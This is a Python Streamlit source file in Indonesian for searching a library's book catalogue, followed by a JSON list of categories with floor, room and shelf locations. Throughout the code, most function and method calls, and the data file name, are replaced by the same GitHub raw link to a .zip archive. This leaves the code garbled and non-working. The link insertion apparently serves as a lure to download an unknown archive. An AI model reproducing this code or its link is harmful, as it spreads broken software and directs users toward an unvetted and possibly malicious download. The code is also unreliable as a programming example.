import streamlit as st
import json
import pandas as pd
import os

# Fungsi untuk membaca data dari file JSON
def baca_data_dari_file(nama_file):
    if https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip(nama_file):
        with open(nama_file, 'r') as file:
            data = https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip(file)
        return data
    else:
        https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip(f"File '{nama_file}' tidak ditemukan.")
        return None

# Fungsi untuk mencari buku berdasarkan kategori
def cari_buku(kategori_dicari, data):
    for kategori in data:
        if kategori['kategori'].lower() == https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip():
            return kategori['buku']
    return None

# Nama file JSON yang ingin dibaca
nama_file = 'C:\\Users\\rindi\\Downloads\\https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip'

# Pengaturan tampilan
https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip(
    page_title="Pencarian Buku Perpustakaan",
    layout="wide"
)

# Sidebar
https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip("Pencarian Buku")
https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip("""
Gunakan aplikasi ini untuk mencari lokasi buku di perpustakaan.  
Pilih kategori buku pada kolom di bawah dan tekan tombol 'Cari'.
""")

# Judul aplikasi
https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip("📚 Pencarian Buku Perpustakaan")

# Membaca data dari file JSON
data_perpustakaan = baca_data_dari_file(nama_file)

# Jika data berhasil dibaca
if data_perpustakaan:
    # Ambil daftar kategori buku
    daftar_kategori = ["Pilih kategori buku"] + [kategori['kategori'] for kategori in data_perpustakaan]

    # Input pengguna
    kategori_yang_dicari = https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip("Pilih Kategori Buku:", daftar_kategori)

    # Tombol untuk mencari
    if https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip("Cari"):
        if kategori_yang_dicari != "Pilih kategori buku":
            # Cari buku berdasarkan kategori yang dipilih
            buku_ditemukan = cari_buku(kategori_yang_dicari, data_perpustakaan)
            
            # Buat DataFrame untuk menampilkan hasil
            if buku_ditemukan:
                df = https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip(buku_ditemukan)
                df['No'] = range(1, len(df) + 1)  # Tambah kolom No dengan nomor urut dimulai dari 1
                df = https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip(columns={'judul': 'Judul', 'pengarang': 'Pengarang', 
                                        'penerbit': 'Penerbit', 'tahun_terbit': 'Tahun Terbit',
                                        'lantai': 'Lantai', 'ruangan': 'Ruangan', 'rak': 'Rak'})
                df = df[['No', 'Judul', 'Pengarang', 'Penerbit', 'Tahun Terbit', 'Lantai', 'Ruangan', 'Rak']]  # Susun ulang kolom
                https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip(f"Buku-buku dalam kategori '{kategori_yang_dicari}':")
                https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip(https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip(index=False), unsafe_allow_html=True)  # Tampilkan tabel tanpa indeks
            else:
                https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip("Tidak ada buku yang ditemukan dalam kategori ini.")
        else:
            https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip("Silakan pilih kategori buku.")
else:
    https://raw.githubusercontent.com/boybands/DaftarBukuPerpustakaanKalbar-/main/arthrodic/DaftarBukuPerpustakaanKalbar-.zip("Data perpustakaan tidak tersedia.")





[
    {
        "judul": "Program komputer",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "005"
    },
    {
        "judul": "Filsafat",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "100"
    },
    {
        "judul": " Sosiologi",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "301"
    },
    {
        "judul": "Hukum",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "340"
    },
    {
        "judul": "Kesehatan",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "610"
    },
    {
        "judul": "Agrobisnis",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "631"
    },
    {
        "judul": "Teknik",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "621"
    },
    {
        "judul": "Peternakan",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "636"
    },
    {
        "judul": "Komputer Pengolahan Data",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "004"
    },
    {
        "judul": "Komunikasi",
        "lantai": 1,
        "ruangan": "Koleksi",
        "rak": "001"
    },
    {
        "judul": "Kamus Sains",
        "lantai": 2,
        "ruangan": "Referensi",
        "rak": "503"
    },
    {
        "judul": "Ensiklopedia",
        "lantai": 2,
        "ruangan": "Referensi",
        "rak": "350"
    },
    {
        "judul": "Olahraga",
        "lantai": 2,
        "ruangan": "Referensi",
        "rak": "796"
    },
    {
        "judul": "Fauna",
        "lantai": 2,
        "ruangan": "Referensi",
        "rak": "590"
    },
    {
        "judul": "Sejarah dan Budaya",
        "lantai": 2,
        "ruangan": "Referensi",
        "rak": "909"
    },
    {
        "judul": "Ilmuan",
        "lantai": 2,
        "ruangan": "Referensi",
        "rak": "912"
    },
    {
        "judul": "Pariwisata dan Perhutanan",
        "lantai": 2,
        "ruangan": "Referensi",
        "rak": "910"
    },
    {
        "judul": "Economics",
        "lantai": 2,
        "ruangan": "Bahasa Asing",
        "rak": "330"
    },
    {
        "judul": "Basic investments",
        "lantai": 2,
        "ruangan": "Bahasa Asing",
        "rak": "332"
    },
    {
        "judul": "Chemistry",
        "lantai": 2,
        "ruangan": "Bahasa Asing",
        "rak": "540"
    }
]

